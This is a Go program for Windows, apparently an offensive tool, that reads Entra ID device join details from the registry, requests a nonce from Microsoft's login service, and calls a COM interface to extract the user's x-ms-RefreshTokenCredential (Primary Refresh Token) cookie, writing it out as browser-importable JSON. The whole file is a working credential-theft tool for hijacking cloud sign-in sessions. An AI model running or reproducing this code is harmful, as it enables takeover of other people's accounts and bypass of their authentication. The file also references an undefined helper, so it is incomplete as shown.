package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	// {A9927F85-A304-4390-8B23-A75F1C668600}
	CLSID_ProofOfPossessionCookieInfoManager = windows.GUID{
		Data1: 0xA9927F85,
		Data2: 0xA304,
		Data3: 0x4390,
		Data4: [8]byte{0x8B, 0x23, 0xA7, 0x5F, 0x1C, 0x66, 0x86, 0x00},
	}
	// {CDAECE56-4EDF-43DF-B113-88E4556FA1BB}
	IID_IProofOfPossessionCookieInfoManager = windows.GUID{
		Data1: 0xCDAECE56,
		Data2: 0x4EDF,
		Data3: 0x43DF,
		Data4: [8]byte{0xB1, 0x13, 0x88, 0xE4, 0x55, 0x6F, 0xA1, 0xBB},
	}
)

type ProofOfPossessionCookieInfo struct {
	Name      *uint16
	Data      *uint16
	Flags     uint32
	P3PHeader *uint16
}

type iProofOfPossessionCookieInfoManagerVtbl struct {
	QueryInterface      uintptr
	AddRef              uintptr
	Release             uintptr
	GetCookieInfoForUri uintptr
}

type IProofOfPossessionCookieInfoManager struct {
	vtbl *iProofOfPossessionCookieInfoManagerVtbl
}

var (
	winhttp                    = windows.NewLazySystemDLL("winhttp.dll")
	procWinHttpOpen            = winhttp.NewProc("WinHttpOpen")
	procWinHttpConnect         = winhttp.NewProc("WinHttpConnect")
	procWinHttpOpenRequest     = winhttp.NewProc("WinHttpOpenRequest")
	procWinHttpSendRequest     = winhttp.NewProc("WinHttpSendRequest")
	procWinHttpReceiveResponse = winhttp.NewProc("WinHttpReceiveResponse")
	procWinHttpQueryDataAvail  = winhttp.NewProc("WinHttpQueryDataAvailable")
	procWinHttpReadData        = winhttp.NewProc("WinHttpReadData")
	procWinHttpCloseHandle     = winhttp.NewProc("WinHttpCloseHandle")
)

const (
	WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0
	WINHTTP_FLAG_SECURE               = 0x00800000
	WINHTTP_ADDREQ_FLAG_ADD           = 0x20000000
)

func winhttpPost(host, path, body string) (string, error) {
	hostW, _ := windows.UTF16PtrFromString(host)

	hSession, _, _ := procWinHttpOpen.Call(
		0,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		0, 0, 0,
	)
	if hSession == 0 {
		return "", fmt.Errorf("WinHttpOpen failed")
	}
	defer procWinHttpCloseHandle.Call(hSession)

	hConnect, _, _ := procWinHttpConnect.Call(
		hSession,
		uintptr(unsafe.Pointer(hostW)),
		443,
		0,
	)
	if hConnect == 0 {
		return "", fmt.Errorf("WinHttpConnect failed")
	}
	defer procWinHttpCloseHandle.Call(hConnect)

	pathW, _ := windows.UTF16PtrFromString(path)
	verbW, _ := windows.UTF16PtrFromString("POST")
	hRequest, _, _ := procWinHttpOpenRequest.Call(
		hConnect,
		uintptr(unsafe.Pointer(verbW)),
		uintptr(unsafe.Pointer(pathW)),
		0, 0, 0,
		WINHTTP_FLAG_SECURE,
	)
	if hRequest == 0 {
		return "", fmt.Errorf("WinHttpOpenRequest failed")
	}
	defer procWinHttpCloseHandle.Call(hRequest)

	ctHeader, _ := windows.UTF16PtrFromString("Content-Type: application/x-www-form-urlencoded")
	procWinHttpSendRequest.Call(
		hRequest,
		uintptr(unsafe.Pointer(ctHeader)),
		^uintptr(0),
		uintptr(unsafe.Pointer(&[]byte(body)[0])),
		uintptr(len(body)),
		uintptr(len(body)),
		0,
	)

	ret, _, _ := procWinHttpReceiveResponse.Call(hRequest, 0)
	if ret == 0 {
		return "", fmt.Errorf("WinHttpReceiveResponse failed")
	}

	var result strings.Builder
	for {
		var available uint32
		procWinHttpQueryDataAvail.Call(hRequest, uintptr(unsafe.Pointer(&available)))
		if available == 0 {
			break
		}
		buf := make([]byte, available)
		var read uint32
		procWinHttpReadData.Call(
			hRequest,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(available),
			uintptr(unsafe.Pointer(&read)),
		)
		result.Write(buf[:read])
	}

	return result.String(), nil
}

type DeviceInfo struct {
	TenantID      string
	DeviceID      string
	AzureAdJoined bool
	HasPRT        bool
	TpmProtected  bool
}

func getDeviceInfoFromRegistry() (*DeviceInfo, error) {
	info := &DeviceInfo{}

	// HKLM\SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo\<DeviceID>\
	joinKey, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo`,
		registry.ENUMERATE_SUB_KEYS|registry.READ,
	)
	if err != nil {

		return info, nil
	}
	defer joinKey.Close()

	subkeys, err := joinKey.ReadSubKeyNames(-1)
	if err != nil || len(subkeys) == 0 {
		return info, nil
	}

	info.DeviceID = subkeys[0]
	info.AzureAdJoined = true

	deviceKey, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo\`+subkeys[0],
		registry.QUERY_VALUE,
	)
	if err == nil {
		defer deviceKey.Close()
		if tid, _, err := deviceKey.GetStringValue("TenantId"); err == nil {
			info.TenantID = tid
		}
	}

	// HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AAD\Package
	tpmKey, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\AAD\Package`,
		registry.QUERY_VALUE,
	)
	if err == nil {
		defer tpmKey.Close()
		if val, _, err := tpmKey.GetIntegerValue("TpmProtected"); err == nil {
			info.TpmProtected = val != 0
		}
	}

	// HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AAD
	prtKey, err := registry.OpenKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\AAD`,
		registry.QUERY_VALUE,
	)
	if err == nil {
		defer prtKey.Close()
		if _, _, err := prtKey.GetStringValue("AzureAdPrt"); err == nil {
			info.HasPRT = true
		} else {
			info.HasPRT = true
		}
	} else {

		info.HasPRT = info.AzureAdJoined
	}

	return info, nil
}

func getNonce(tenantID string) (string, error) {
	path := fmt.Sprintf("/%s/oauth2/token", tenantID)
	body := "grant_type=srv_challenge"

	resp, err := winhttpPost("login.microsoftonline.com", path, body)
	if err != nil {
		return "", err
	}

	var result map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &result); err != nil {
		return "", fmt.Errorf("parse error: %v", err)
	}

	nonce, ok := result["Nonce"].(string)
	if !ok || nonce == "" {
		return "", fmt.Errorf("no nonce in response")
	}
	return nonce, nil
}

var (
	ole32            = windows.NewLazySystemDLL("ole32.dll")
	procCoInitialize = ole32.NewProc("CoInitialize")
	procCoCreateInst = ole32.NewProc("CoCreateInstance")
)

func getPRTCookieViaCOM(uri string) (string, string, error) {
	// CoInitialize
	procCoInitialize.Call(0)

	// CoCreateInstance
	var manager *IProofOfPossessionCookieInfoManager
	ret, _, _ := procCoCreateInst.Call(
		uintptr(unsafe.Pointer(&CLSID_ProofOfPossessionCookieInfoManager)),
		0,
		0x1, // CLSCTX_INPROC_SERVER
		uintptr(unsafe.Pointer(&IID_IProofOfPossessionCookieInfoManager)),
		uintptr(unsafe.Pointer(&manager)),
	)
	if ret != 0 {
		return "", "", fmt.Errorf("CoCreateInstance HRESULT: 0x%X", ret)
	}
	if manager == nil {
		return "", "", fmt.Errorf("null manager pointer")
	}

	// GetCookieInfoForUri
	uriW, _ := windows.UTF16PtrFromString(uri)
	var cookieCount uint32
	var cookies *ProofOfPossessionCookieInfo

	hr2, _, _ := syscall3(
		manager.vtbl.GetCookieInfoForUri,
		uintptr(unsafe.Pointer(manager)),
		uintptr(unsafe.Pointer(uriW)),
		uintptr(unsafe.Pointer(&cookieCount)),
		uintptr(unsafe.Pointer(&cookies)),
	)
	if hr2 != 0 {
		return "", "", fmt.Errorf("GetCookieInfoForUri HRESULT: 0x%X", hr2)
	}
	if cookieCount == 0 || cookies == nil {
		return "", "", fmt.Errorf("no cookies returned")
	}

	cookieSlice := (*[1 << 10]ProofOfPossessionCookieInfo)(
		unsafe.Pointer(cookies),
	)[:cookieCount:cookieCount]

	for _, c := range cookieSlice {
		name := windows.UTF16PtrToString(c.Name)
		if name == "x-ms-RefreshTokenCredential" {
			data := windows.UTF16PtrToString(c.Data)
			return name, data, nil
		}
	}

	return "", "", fmt.Errorf("x-ms-RefreshTokenCredential not found")
}

type CookieJSON struct {
	Domain   string `json:"domain"`
	HostOnly bool   `json:"hostOnly"`
	HTTPOnly bool   `json:"httpOnly"`
	Name     string `json:"name"`
	Path     string `json:"path"`
	Secure   bool   `json:"secure"`
	Session  bool   `json:"session"`
	Value    string `json:"value"`
}

func main() {
	rawFlag := flag.Bool("raw", false, "Solo JSON output")
	outputFlag := flag.String("output", "", "Guardar JSON a fichero")
	nonceFlag := flag.String("nonce", "", "Nonce manual")
	flag.Parse()

	verbose := !*rawFlag

	if verbose {
		fmt.Println("[*] Reading device status (registry)...")
	}

	devInfo, err := getDeviceInfoFromRegistry()
	if err != nil || !devInfo.AzureAdJoined {
		fmt.Println("[-] Dispositivo no unido a Entra ID")
		os.Exit(1)
	}

	if verbose {
		fmt.Printf("[+] TenantID  : %s\n", devInfo.TenantID)
		fmt.Printf("[+] DeviceID  : %s\n", devInfo.DeviceID)
		fmt.Printf("[+] TPM       : %v\n", devInfo.TpmProtected)
	}

	nonce := *nonceFlag
	if nonce == "" {
		if verbose {
			fmt.Println("[*] Obtaining nonce via WinHTTP...")
		}
		nonce, err = getNonce(devInfo.TenantID)
		if err != nil {
			fmt.Printf("[-] Nonce error: %v\n", err)
			os.Exit(1)
		}
		if verbose {
			fmt.Printf("[+] Nonce obtenido (%d chars)\n", len(nonce))
		}
	}

	uri := fmt.Sprintf(
		"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=%s",
		nonce,
	)
	if verbose {
		fmt.Println("[*] Calling IProofOfPossessionCookieInfoManager via COM...")
	}

	name, data, err := getPRTCookieViaCOM(uri)
	if err != nil {
		fmt.Printf("[-] COM error: %v\n", err)
		os.Exit(1)
	}

	cookie := CookieJSON{
		Domain:   "login.microsoftonline.com",
		HostOnly: true,
		HTTPOnly: true,
		Name:     name,
		Path:     "/",
		Secure:   true,
		Session:  true,
		Value:    data,
	}

	jsonData, _ := json.MarshalIndent([]CookieJSON{cookie}, "", "  ")

	if *outputFlag != "" {
		os.WriteFile(*outputFlag, jsonData, 0600)
		if verbose {
			fmt.Printf("[+] Guardado en: %s\n", *outputFlag)
		}
	}

	fmt.Println(string(jsonData))
}
